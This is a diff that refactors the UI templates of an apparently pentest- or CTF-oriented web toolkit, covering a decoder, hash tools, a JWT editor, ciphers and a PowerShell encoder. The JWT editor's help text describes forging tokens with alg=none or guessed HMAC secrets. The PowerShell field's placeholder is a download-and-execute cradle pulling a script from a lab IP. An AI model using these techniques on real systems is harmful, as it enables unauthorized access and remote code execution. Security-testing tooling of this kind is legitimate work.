@@ -312,17 +312,8 @@ TOOLS['magic'] = {
   desc: 'Detect unknown encodings and decode them automatically, including nested layers.',
   render: () => `
     <div class="tool">
-      <div class="card">
-        <div class="card-title">Input</div>
-        <div class="field">
-          <label>Paste encoded / obfuscated data</label>
-          <textarea id="magic-in" class="tc-area" placeholder="e.g. ZmxhZ3tyZWRraXRfbWFnaWN9" autocomplete="off" spellcheck="false"></textarea>
-        </div>
-      </div>
-      <div class="card">
-        <div class="result-header"><h4>Detected candidates</h4></div>
-        <div id="magic-out"></div>
-      </div>
+      ${card('Input', field('Paste encoded / obfuscated data', `<textarea id="magic-in" class="tc-area" placeholder="e.g. ZmxhZ3tyZWRraXRfbWFnaWN9" autocomplete="off" spellcheck="false"></textarea>`))}
+      ${card('', resultHead('Detected candidates') + `<div id="magic-out"></div>`)}
     </div>`,
   init() {
     const box = $('#magic-out');
@@ -355,17 +346,11 @@ TOOLS['hash'] = {
   render() {
     return `
       <div class="tool">
-        <div class="card">
-          <div class="card-title">Input</div>
-          <div class="field">
-            <textarea id="hash-input" placeholder="enter text..."></textarea>
-          </div>
+        ${card('Input', `
+          ${field('', `<textarea id="hash-input" placeholder="enter text..."></textarea>`)}
           <button class="btn" id="hash-gen">Generate Hashes</button>
-        </div>
-        <div class="card" id="hash-results" style="display:none">
-          <div class="card-title">Hashes</div>
-          <div id="hash-output"></div>
-        </div>
+        `)}
+        ${card('Hashes', `<div id="hash-output"></div>`, { id: 'hash-results', hidden: true })}
       </div>
     `;
   },
@@ -397,22 +382,18 @@ TOOLS['hash-id'] = {
   render() {
     return `
       <div class="tool">
-        <div class="card">
-          <div class="card-title">Hash</div>
-          <div class="field">
-            <textarea id="hid-input" rows="3" placeholder="paste hash here (e.g. 5d41402abc4b2a76b9719d911017c592)"></textarea>
-          </div>
+        ${card('Hash', `
+          ${field('', `<textarea id="hid-input" rows="3" placeholder="paste hash here (e.g. 5d41402abc4b2a76b9719d911017c592)"></textarea>`)}
           <div class="btn-row">
             <button class="btn" id="hid-id">Identify</button>
             <button class="btn btn-secondary" id="hid-clear">Clear</button>
           </div>
-        </div>
-        <div class="card" id="hid-results" style="display:none">
-          <div class="card-title">Hash Information</div>
+        `)}
+        ${card('Hash Information', `
           <dl class="info-grid" id="hid-info"></dl>
           <div class="rec-section-label" style="margin-top:18px">Possible Hash Types</div>
           <div class="payload-list" id="hid-output"></div>
-        </div>
+        `, { id: 'hid-results', hidden: true })}
       </div>
     `;
   },
@@ -619,47 +600,26 @@ TOOLS['jwt'] = {
   render() {
     return `
       <div class="tool">
-        <div class="card">
-          <div class="card-title">JWT Token</div>
-          <div class="field">
-            <textarea id="jwt-input" rows="4" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."></textarea>
-          </div>
+        ${card('JWT Token', `
+          ${field('', `<textarea id="jwt-input" rows="4" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."></textarea>`)}
           <div class="btn-row">
             <button class="btn" id="jwt-decode">Decode &amp; Edit</button>
           </div>
-        </div>
-
-        <div class="card" id="jwt-results" style="display:none">
-          <div class="card-title">Decoded</div>
-          <div id="jwt-output"></div>
-        </div>
-
-        <div class="card" id="jwt-editor" style="display:none">
-          <div class="card-title">Edit &amp; Re-sign Token</div>
+        `)}
+        ${card('Decoded', `<div id="jwt-output"></div>`, { id: 'jwt-results', hidden: true })}
+        ${card('Edit &amp; Re-sign Token', `
           <p style="color:var(--text-mute);font-size:12px;margin-bottom:12px">Modify the header or payload below, then rebuild a new token. Use <strong>alg=none</strong> to test missing-signature bugs, or <strong>HS256</strong> with a guessed secret to forge a valid token.</p>
-          <div class="field">
-            <label>Header (JSON)</label>
-            <textarea id="jwt-edit-header" rows="4" class="mono"></textarea>
-          </div>
-          <div class="field">
-            <label>Payload (JSON)</label>
-            <textarea id="jwt-edit-payload" rows="6" class="mono"></textarea>
-          </div>
+          ${field('Header (JSON)', `<textarea id="jwt-edit-header" rows="4" class="mono"></textarea>`)}
+          ${field('Payload (JSON)', `<textarea id="jwt-edit-payload" rows="6" class="mono"></textarea>`)}
           <div class="field-row">
-            <div class="field">
-              <label>Signing</label>
-              <select id="jwt-sign-alg">
+            ${field('Signing', `<select id="jwt-sign-alg">
                 <option value="none">alg=none (no signature)</option>
                 <option value="HS256">HS256 (HMAC-SHA256)</option>
                 <option value="HS384">HS384 (HMAC-SHA384)</option>
                 <option value="HS512">HS512 (HMAC-SHA512)</option>
                 <option value="keep">Keep original signature</option>
-              </select>
-            </div>
-            <div class="field">
-              <label>Secret (HMAC only)</label>
-              <input type="text" id="jwt-secret" placeholder="secret / leak / weak-key">
-            </div>
+              </select>`)}
+            ${field('Secret (HMAC only)', `<input type="text" id="jwt-secret" placeholder="secret / leak / weak-key">`)}
           </div>
           <div class="btn-row">
             <button class="btn" id="jwt-rebuild">Rebuild Token</button>
@@ -673,7 +633,7 @@ TOOLS['jwt'] = {
             <button class="btn btn-ghost" id="jwt-copy-new">Copy</button>
           </div>
           <div id="jwt-edit-status" style="margin-top:8px;font-size:12px;color:var(--text-mute)"></div>
-        </div>
+        `, { id: 'jwt-editor', hidden: true })}
       </div>
     `;
   },
@@ -846,7 +806,7 @@ TOOLS['jwt'] = {
       setEditStatus('No match in the common secrets list. Try a real wordlist offline (jwt_tool, hashcat -m 16500).', true);
     });
 
-    $('#jwt-copy-new').addEventListener('click', () => copy($('#jwt-output-token').value));
+    wireCopy('jwt-copy-new', () => $('#jwt-output-token').value);
   }
 };
 
@@ -857,26 +817,17 @@ TOOLS['cipher'] = {
   render() {
     return `
       <div class="tool">
-        <div class="card">
-          <div class="card-title">Input</div>
-          <div class="field">
-            <textarea id="cip-input" placeholder="enter text..."></textarea>
-          </div>
-          <div class="field">
-            <label>Caesar shift (for Caesar cipher)</label>
-            <input type="number" id="cip-shift" value="13">
-          </div>
+        ${card('Input', `
+          ${field('', `<textarea id="cip-input" placeholder="enter text..."></textarea>`)}
+          ${field('Caesar shift (for Caesar cipher)', `<input type="number" id="cip-shift" value="13">`)}
           <div class="btn-row">
             <button class="btn" data-cmd="rot13">ROT13</button>
             <button class="btn" data-cmd="caesar">Caesar</button>
             <button class="btn" data-cmd="atbash">Atbash</button>
             <button class="btn" data-cmd="reverse">Reverse</button>
           </div>
-        </div>
-        <div class="card" id="cip-results" style="display:none">
-          <div class="result-header"><h4>Output</h4><button class="btn btn-ghost" id="cip-copy">Copy</button></div>
-          <div class="result-box" id="cip-output"></div>
-        </div>
+        `)}
+        ${card('', resultHead('Output', ghostBtn('cip-copy')) + `<div class="result-box" id="cip-output"></div>`, { id: 'cip-results', hidden: true })}
       </div>
     `;
   },
@@ -903,7 +854,7 @@ TOOLS['cipher'] = {
         $('#cip-results').style.display = 'block';
       });
     });
-    $('#cip-copy').addEventListener('click', () => copy($('#cip-output').textContent));
+    wireCopy('cip-copy', () => $('#cip-output').textContent);
   }
 };
 
@@ -915,13 +866,7 @@ TOOLS['ps-encode'] = {
   render() {
     return `
       <div class="tool">
-        <div class="card">
-          <div class="card-title">PowerShell Command</div>
-          <div class="field">
-            <label>Command to encode</label>
-            <textarea id="pe-in" placeholder="IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.1/s.ps1')"></textarea>
-          </div>
-        </div>
+        ${card('PowerShell Command', field('Command to encode', `<textarea id="pe-in" placeholder="IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.1/s.ps1')"></textarea>`))}
         <div id="pe-out"></div>
       </div>`;
   },
